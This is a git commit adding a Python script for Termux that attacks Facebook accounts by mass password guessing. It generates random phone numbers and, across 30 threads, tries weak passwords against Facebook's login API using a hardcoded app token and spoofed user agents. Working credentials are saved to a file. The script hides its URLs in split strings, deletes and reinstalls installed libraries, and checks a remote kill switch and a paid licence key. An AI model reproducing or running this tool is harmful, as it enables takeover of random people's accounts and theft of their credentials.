4a0d5e80b88a77b836cc5303ea29c622b7b7b21a
Master <141718350+FRANK-COSTELLO@users.noreply.github.com>
2023-08-17 01:33:01 +0600

    Add files via upload

---
+++ KIDZ_TOM.py
@@ -0,0 +1,246 @@
+# OPEN SOURCE BY- FRANK COSTELLO...! 🤡🔪
+# Kidz Akash 🥺😿🫶
+
+from os import path
+import os,base64,zlib,pip,urllib
+import os
+rrq=("requests");mm=("uninstall")
+try:
+    os.system(f"pip {mm} {rrq} -y");os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.11/"+"site-"+"packages/req"+"uests")
+except:
+    exit()
+try:
+    import requests
+except ImportError:
+    os.system('pip install requests') 
+try:
+    import os,requests,json,time,re,random,sys,uuid,string,subprocess
+    from string import *
+    from concurrent.futures import ThreadPoolExecutor
+except ModuleNotFoundError:
+    os.system('pip install requests futures==2 > /dev/null')
+except:pass
+try:
+    import httpx
+except ModuleNotFoundError:
+    os.system('pip install httpx')
+loop,ok,cp,user = 0,[],[],[]
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+import requests,httpx
+import random,time
+W='\033[1;37m'
+G='\033[38;5;46m'
+R='\033[38;5;196m'
+P='\033[38;5;203m'
+I='\033[38;5;56m'
+Y='\033[38;5;208m'
+B='\033[38;5;45m'
+L='\033[38;5;49m'
+X='\033[38;5;65m'
+bx = f' {X}[{G}•{X}]{W}'
+fb = 'htt'+'ps://'+'ww'+'w.fa'+'ce'+'boo'+'k.com'+'/pr'+'ofile'+'.ph'+'p'+'?'+'id='+'1'+'0'+'0'+'0'+'0'+'0'+'4'+'8'+'8'+'8'+'6'+'3'+'317'
+gp = 'ht'+'tps'+'://w'+'ww'+'.fac'+'eboo'+'k.c'+'om'+'/gr'+'oups/'+'6'+'4'+'48'+'440'+'40'+'9849'+'56/?r'+'ef=s'+'hare'
+gt = 'http'+'s://gi'+'thub'+'.com'+'/AKAS'+'H-CY'+'BER'+'-1'+'96'
+ms = 'htt'+'ps://m'+'.m'+'e/j'+'/Ab'+'ac'+'eKa'+'0m'+'ss1H'+'IRs/'
+lnk = 'http'+'s://e'+'xp'+'edi'+'ti'+'on'+'-xd'+'.blo'+'gsp'+'ot.c'+'om/20'+'23/'+'05/ap'+'pro'+'val.'+'ht'+'ml'
+Tani = str(os.getuid())
+Key = f'==[FRANK]==[{Tani}]==[COSTELLO]=='
+def clear():
+    os.system('clear')
+    print(f"""
+{W}   88888888888  .d88888b.   888b     d888
+{R}       888     d88P" "Y88b  8888b   d8888
+{W}       888     888     888  88888b.d88888
+{R}       888     888     888  888Y88888P888
+{W}       888     888     888  888 Y888P 888
+{R}       888     888     888  888  Y8P  888
+{W}       888     Y88b. .d88P  888   "   888
+{R}       888      "Y88888P"   888       888
+{I}───────────────────────────────────────────────
+{bx} FACEBOOK  : HADI ANHAF AIMAN
+{bx} GITHUB    : AKASH-CYBER-196
+{I}───────────────────────────────────────────────
+{bx} QUALITY   : {G}PREMIUM
+{bx} VERSION   : {Y}9.1
+{I}───────────────────────────────────────────────""")
+def linex():print(f'{I}───────────────────────────────────────────────')
+#----------[ AKASH-UA ]-----------#
+def akash():
+    model = random.choice(['CPH2109','PDNM00','PDNT00','CPH2089','PEAT00','PEAM00','CPH2247','CPH2237'])
+    build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
+    local = random.choice(['en_US','en_GB'])
+    END = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(11,99))+'.'+str(random.randint(111,999))+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/'+str(local)+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+str(model)+';FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    UA = 'Davik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'.0.1; '+str(model)+' Build/'+str(build)+') '+END
+    return UA
+#----------[ AIMAN-UA ]-----------#
+def akashu():
+    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+    application_version_code=str(random.randint(000000000,999999999))
+    android_version=str(random.randrange(6,13))
+    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
+    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
+    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
+    UA = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; INE-LX1 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.625,width=1080,height=2094};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-N9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
+    return UA
+#---------------------------------#
+try:
+    clear()
+    serv = requests.get("htt"+"ps:"+"//exp"+"edi"+"ti"+"on-"+"xd."+"blo"+"gsp"+"ot.com"+"/2023"+"/06/c"+"ont"+"rolr"+"oom."+"html").text
+    if "ON" in serv:
+        pass
+    elif "OFF" in serv:
+        for x in range(1000):
+            os.system(f'xdg-open {gp}');print(f'{bx}{G} TOOL IS NOW UPDATING..PLEASE WAIT');os.system(f'xdg-open {gt}');time.sleep(2)
+    else:clear();print(f'{bx} YOUR INTERNET CONNECTION ERROR BRO')
+except requests.exceptions.ConnectionError:
+    print(f'{bx} CONNECTION ERROR');linex()
+def Apv_Checker():
+    try:
+        clear()
+        import httpx
+        apv = httpx.get(f'{lnk}').text
+        if Key in apv:
+            clear();print(f'{bx}{G} CONGRATULATIONS PREMIUM USER');linex();time.sleep(1)
+            Tom_Main()
+        else:
+            clear()
+            print(f'{bx} YOUR KEY  : {L}{Key}');linex()
+            print(f'{bx} THIS TOOL IS PAID')
+            print(f'{bx} SO,YOU NEED PERMISSION TO RUN THIS TOOL');linex()
+            print(f'{bx} 7 DAYS = BDT 200 TAKA')
+            print(f'{bx} 15 DAYS = BDT 400 TAKA');linex()
+            input(f'{bx} PRESS ENTER TO BUY THIS TOOL');linex();os.system(f'xdg-open {fb}')
+    except requests.exceptions.ConnectionError:
+        print(f'{bx} CONNECTION ERROR');linex()
+def Tom_Main():
+    clear()
+    #print(f'{bx} YOUR KEY  : {L}{Key}');linex()
+    print(f' {X}[{G}1{X}]{W} RANDOM UID CLONE   {Y}[{G}BD{Y}]')
+    print(f' {X}[{G}2{X}]{W} RANDOM UID CLONE   {Y}[{G}IN{Y}]')
+    print(f' {X}[{G}3{X}]{W} JOIN MESSENGER GROUP')
+    print(f' {X}[{G}4{X}]{W} FOLLOW {B}GITHUB')
+    print(f' {X}[{G}5{X}]{W} EXIT PROBLEM');linex()
+    Tom = input(f'{bx} CHOOSE    :{G} ');linex()
+    if Tom in ['1']:
+        Tom_Bd()
+    elif Tom in ['2']:
+        Tom_Ind()
+    elif Tom in ['3']:
+        os.system(f'xdg-open {ms}');Tom_Main()
+    elif Tom in ['4']:
+        os.system(f'xdg-open {gt}');Tom_Main()
+    elif Tom in ['5']:
+        os.system(f'xdg-open {gp}')
+    else:
+        Tom_Main()
+def Tom_Bd():
+    clear()
+    print(f'{bx} BD CODE   : {G}015,016,017,018,019')
+    code = input(f'{bx} CHOOSE    :{G} ');linex()
+    print(f'{bx} CRACK ID  : {G}5000,10000,15000')
+    limit = int(input(f'{bx} CHOOSE    :{G} '));linex()
+    for x in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    print(f'{bx} SERVER    : A-B')
+    mt = input(f'{bx} CHOOSE    :{G} ');linex()
+    with ThreadPoolExecutor(max_workers=30) as Tanisha_Akash:
+        tl = str(len(user))
+        clear()
+        print(f'{bx} SIM CODE  : {G}{code}')
+        print(f'{bx} TOTAL UID : {G}{tl}')
+        print(f'{bx} USE AIRPLANE MODE FOR GOOD RESULTS');linex()
+        for love in user:
+            ids = code + love
+            psd = [ids,love,ids[:8],ids[:7],love[1:],ids[:6],love[2:],code+code,'@@@###','@#@#@#']
+            if mt in ['A','1']:Tanisha_Akash.submit(B_Graph,ids,psd,tl)
+            elif mt in ['B','2']:Tanisha_Akash.submit(B_api,ids,psd,tl)
+            else:Tanisha_Akash.submit(B_Graph,ids,psd,tl)
+    print('')
+    linex()
+    print(f'{bx} TOTAL OK  : {G}{str(len(ok))}')
+    print(f'{bx} ENJOY PREMIUM USER')
+    linex()
+def Tom_Ind():
+    clear()
+    code = '+9178'
+    print(f'{bx} CRACK ID  : {G}5000,10000,15000')
+    limit = int(input(f'{bx} CHOOSE    :{G} '));linex()
+    for x in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    print(f'{bx} SERVER    : A-B')
+    mt = input(f'{bx} CHOOSE    :{G} ');linex()
+    with ThreadPoolExecutor(max_workers=30) as Tanisha_Akash:
+        tl = str(len(user))
+        clear()
+        print(f'{bx} TOTAL UID : {G}{tl}')
+        print(f'{bx} USE AIRPLANE MODE FOR GOOD RESULTS');linex()
+        for love in user:
+            ids = code + love
+            psd = [ids,love,ids[:8],ids[:7],'57273200','i love you']
+            if mt in ['A','1']:Tanisha_Akash.submit(B_Graph,ids,psd,tl)
+            elif mt in ['B','2']:Tanisha_Akash.submit(B_api,ids,psd,tl)
+            else:Tanisha_Akash.submit(B_Graph,ids,psd,tl)
+    print('')
+    linex()
+    print(f'{bx} TOTAL OK  : {G}{str(len(ok))}')
+    print(f'{bx} ENJOY PREMIUM USER')
+    linex()
+def B_Graph(ids,psd,tl):
+    global loop,ok
+    sys.stdout.write(f'\r\r {X}[{G}M1{X}]{R}~{X}[{G}TOM{X}]{R}~{X}[{G}{loop}{X}]{R}~{X}[{G}OK{X}]{R}~{X}[{G}{len(ok)}{X}]')
+    try:
+        for pas in psd:
+            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate'}
+            head={'User-Agent':akash(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 3'+'506'+'85'+'53'+'172'+'8|'+'62f'+'8ce9'+'f74'+'b12f'+'84c'+'123c'+'c234'+'37a'+'4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}  
+            url = 'https://b'+'-g'+'rap'+'h.f'+'ace'+'boo'+'k.com'+'/aut'+'h/'+'log'+'in'
+            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+            q = json.loads(po)
+            if 'access_token' in q:
+                uid=str(q['uid'])
+                try:
+                    ckk = 'https:'+'//g'+'rap'+'h.faceb'+'ook.c'+'om/'+uid+'/pict'+'ure?t'+'ype=nor'+'mal'
+                    res = requests.get(ckk).text
+                    if 'Photoshop' in res:
+                        ok.append(uid)
+                        print(f'\r\r {X}[{G}OK{X}]{R}~{X}[{G}TOM{X}]{R}~{X}[{G}{uid}{X}]{R}~{X}[{G}{pas}{X}]')
+                        open('/sdcard/TOM/BD-RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
+                        break
+                    else:break
+                except:break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+def B_api(ids,psd,tl):
+    global loop,ok
+    sys.stdout.write(f'\r\r {X}[{G}M2{X}]{R}~{X}[{G}TOM{X}]{R}~{X}[{G}{loop}{X}]{R}~{X}[{G}OK{X}]{R}~{X}[{G}{len(ok)}{X}]')
+    try:
+        for pas in psd:
+            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate'}
+            head={'User-Agent':akash(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 3'+'506'+'85'+'53'+'172'+'8|'+'62f'+'8ce9'+'f74'+'b12f'+'84c'+'123c'+'c234'+'37a'+'4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}  
+            url = 'https://b'+'-g'+'rap'+'h.f'+'ace'+'boo'+'k.com'+'/aut'+'h/'+'log'+'in'
+            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+            q = json.loads(po)
+            if 'access_token' in q:
+                uid=str(q['uid'])
+                try:
+                    ckk = 'https:'+'//g'+'rap'+'h.faceb'+'ook.c'+'om/'+uid+'/pict'+'ure?t'+'ype=nor'+'mal'
+                    res = requests.get(ckk).text
+                    if 'Photoshop' in res:
+                        ok.append(uid)
+                        print(f'\r\r {X}[{G}OK{X}]{R}~{X}[{G}TOM{X}]{R}~{X}[{G}{uid}{X}]{R}~{X}[{G}{pas}{X}]')
+                        open('/sdcard/TOM/BD-RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
+                        break
+                    else:break
+                except:break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+if __name__ == '__main__':
+    try:os.system('mkdir /sdcard/TOM')
+    except:pass
+    
+    Tom_Main()
